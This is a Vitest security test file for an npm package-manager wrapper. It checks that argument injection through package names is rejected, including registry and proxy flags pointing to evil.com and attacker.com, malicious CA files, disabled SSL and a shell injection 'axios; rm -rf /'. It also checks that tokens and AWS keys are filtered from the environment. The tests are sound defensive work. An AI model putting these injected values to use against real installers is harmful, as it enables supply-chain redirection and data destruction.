import { describe, it, expect, beforeEach, vi } from 'vitest'
import * as packageManager from '../../src/utils/package-manager'

/**
 * Phase 1 Security Tests
 * Tests for SEC-001 (NPM argument validation) and SEC-002 (safe environment filtering)
 *
 * @group security
 * @group phase-1
 */

describe('Phase 1 Security - NPM Argument & Environment Validation', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('SEC-001: NPM Argument Validation', () => {
    /**
     * Test: Normal package installations should succeed (validation wise)
     */
    it('should accept valid package names without flags', async () => {
      const result = await packageManager.installPackages(['axios', 'lodash'], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: false,
      })

      // Should not fail due to flag validation (may fail for other reasons in test env)
      // The important thing is it's not a validation error
      if (result.error) {
        expect(result.error).not.toContain('Dangerous argument')
      }
    })

    /**
     * Test: Should reject --registry flag injection
     * Attack: npm install --registry=https://evil.com axios
     * Note: This is caught by validatePackageNames, not validateNpmArguments
     */
    it('should reject --registry flag injection via package name', async () => {
      const result = await packageManager.installPackages(
        ['--registry=https://evil.com', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should reject --proxy flag injection
     */
    it('should reject --proxy flag injection via package name', async () => {
      const result = await packageManager.installPackages(
        ['--proxy=http://attacker.com', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should reject --https-proxy flag
     */
    it('should reject --https-proxy flag injection via package name', async () => {
      const result = await packageManager.installPackages(
        ['--https-proxy=https://attacker.com', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should reject --ca flag (custom CA cert)
     */
    it('should reject --ca flag injection via package name', async () => {
      const result = await packageManager.installPackages(
        ['--ca=/path/to/malicious/ca.pem', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should reject --cafile flag
     */
    it('should reject --cafile flag injection via package name', async () => {
      const result = await packageManager.installPackages(
        ['--cafile=/path/to/malicious/ca.pem', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should reject --strict-ssl=false bypass attempt
     */
    it('should reject --strict-ssl flag bypass attempts via package name', async () => {
      const result = await packageManager.installPackages(
        ['--strict-ssl=false', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      // --strict-ssl is dangerous and should be rejected
      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: Should accept safe flags like --legacy-peer-deps
     */
    it('should accept safe --legacy-peer-deps flag', async () => {
      const result = await packageManager.installPackages(['axios'], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: false,
      })

      // Should not fail due to flag validation (may fail for other reasons)
      if (result.error) {
        expect(result.error).not.toContain('Dangerous argument')
        // The error should be about missing directory, not about --legacy-peer-deps
        expect(result.error).not.toContain('--legacy-peer-deps')
      }
    })

    /**
     * Test: Should accept safe --save-dev flag
     */
    it('should accept safe --save-dev flag', async () => {
      const result = await packageManager.installPackages(['axios'], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: true,
      })

      // Should not fail due to flag validation (may fail for other reasons)
      if (result.error) {
        expect(result.error).not.toContain('Dangerous argument')
        // The error message may mention npm install but that's OK
        // The important thing is it doesn't reject the --save-dev flag
      }
    })

    /**
     * Test: Should reject command injection via package name
     * Already tested in package-validator, but verify end-to-end
     */
    it('should reject shell command injection in package name', async () => {
      const result = await packageManager.installPackages(['axios; rm -rf /'], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: false,
      })

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })
  })

  describe('SEC-002: Environment Variable Filtering', () => {
    /**
     * Test: Sensitive env vars should not leak in process execution
     * We verify by checking that secrets don't appear in error messages
     */
    it('should filter out NPM_TOKEN from environment', async () => {
      const originalToken = process.env['NPM_TOKEN']
      process.env['NPM_TOKEN'] = 'npm_token_secret_12345'

      try {
        const result = await packageManager.installPackages(['axios'], {
          packageManager: 'npm',
          projectRoot: '/tmp/nonexistent',
          dev: false,
        })

        // Check error doesn't contain our secret
        if (result.error) {
          expect(result.error).not.toContain('npm_token_secret_12345')
        }
      } finally {
        if (originalToken === undefined) {
          delete process.env['NPM_TOKEN']
        } else {
          process.env['NPM_TOKEN'] = originalToken
        }
      }
    })

    /**
     * Test: GH_TOKEN should not leak
     */
    it('should filter out GH_TOKEN from environment', async () => {
      // Set sensitive env var temporarily
      const originalToken = process.env['GH_TOKEN']
      process.env['GH_TOKEN'] = 'ghp_sensitive_token_12345'

      try {
        const result = await packageManager.installPackages(['axios'], {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        })

        // The function should not expose the token in errors
        if (result.error) {
          expect(result.error).not.toContain('ghp_sensitive_token')
        }
      } finally {
        // Restore original
        if (originalToken === undefined) {
          delete process.env['GH_TOKEN']
        } else {
          process.env['GH_TOKEN'] = originalToken
        }
      }
    })

    /**
     * Test: AWS credentials should not leak
     */
    it('should filter out AWS_ACCESS_KEY_ID', async () => {
      const originalKey = process.env['AWS_ACCESS_KEY_ID']
      process.env['AWS_ACCESS_KEY_ID'] = 'AKIAIOSFODNN7EXAMPLE'

      try {
        const result = await packageManager.installPackages(['axios'], {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        })

        // Should not leak credentials
        if (result.error) {
          expect(result.error).not.toContain('AKIAIOSFODNN7EXAMPLE')
        }
      } finally {
        if (originalKey === undefined) {
          delete process.env['AWS_ACCESS_KEY_ID']
        } else {
          process.env['AWS_ACCESS_KEY_ID'] = originalKey
        }
      }
    })

    /**
     * Test: AWS_SECRET_ACCESS_KEY should not leak
     */
    it('should filter out AWS_SECRET_ACCESS_KEY', async () => {
      const originalSecret = process.env['AWS_SECRET_ACCESS_KEY']
      process.env['AWS_SECRET_ACCESS_KEY'] =
        'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'

      try {
        const result = await packageManager.installPackages(['axios'], {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        })

        if (result.error) {
          expect(result.error).not.toContain('wJalrXUtnFEMI')
        }
      } finally {
        if (originalSecret === undefined) {
          delete process.env['AWS_SECRET_ACCESS_KEY']
        } else {
          process.env['AWS_SECRET_ACCESS_KEY'] = originalSecret
        }
      }
    })

    /**
     * Test: Only safe env vars should be passed
     * Verify PATH is included (needed for command execution)
     */
    it('should include PATH in safe environment', async () => {
      const result = await packageManager.installPackages(['axios'], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: false,
      })

      // PATH should be available for command execution
      // If it wasn't, most commands would fail with "command not found"
      // We can't directly test the env object without mocking execa
      expect(result).toBeDefined()
    })

    /**
     * Test: NODE_ENV should be preserved
     */
    it('should preserve NODE_ENV in environment', async () => {
      const originalEnv = process.env['NODE_ENV']
      process.env['NODE_ENV'] = 'production'

      try {
        const result = await packageManager.installPackages(['axios'], {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        })

        // NODE_ENV preservation allows proper npm behavior
        expect(result).toBeDefined()
      } finally {
        if (originalEnv === undefined) {
          delete process.env['NODE_ENV']
        } else {
          process.env['NODE_ENV'] = originalEnv
        }
      }
    })
  })

  describe('Uninstall & Run Script - Security', () => {
    /**
     * Test: uninstallPackages should also reject invalid package names
     */
    it('uninstallPackages should reject flag injection via package name', async () => {
      const result = await packageManager.uninstallPackages(
        ['--registry=https://evil.com', 'axios'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid package name')
    })

    /**
     * Test: runScript should validate arguments
     */
    it('runScript should filter script names safely', async () => {
      const result = await packageManager.runScript('build', {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
      })

      // Should not fail due to argument validation
      // (may fail for other reasons like script not found)
      expect(result.error).not.toContain('Dangerous argument')
    })
  })

  describe('Edge Cases', () => {
    /**
     * Test: Empty package list
     */
    it('should handle empty package list gracefully', async () => {
      const result = await packageManager.installPackages([], {
        packageManager: 'npm',
        projectRoot: '/tmp/test-project',
        dev: false,
      })

      expect(result.success).toBe(true)
      expect(result.packages).toEqual([])
    })

    /**
     * Test: Package name with @ in version
     */
    it('should accept valid scoped package with version', async () => {
      const result = await packageManager.installPackages(
        ['@nestjs/core@^8.0.0'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      // Should not fail due to validation
      expect(result.error).not.toContain('Dangerous argument')
    })

    /**
     * Test: Multiple packages with mixed validity
     */
    it('should reject if ANY package is invalid', async () => {
      const result = await packageManager.installPackages(
        ['axios', '--registry=evil.com'],
        {
          packageManager: 'npm',
          projectRoot: '/tmp/test-project',
          dev: false,
        }
      )

      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })
  })
})
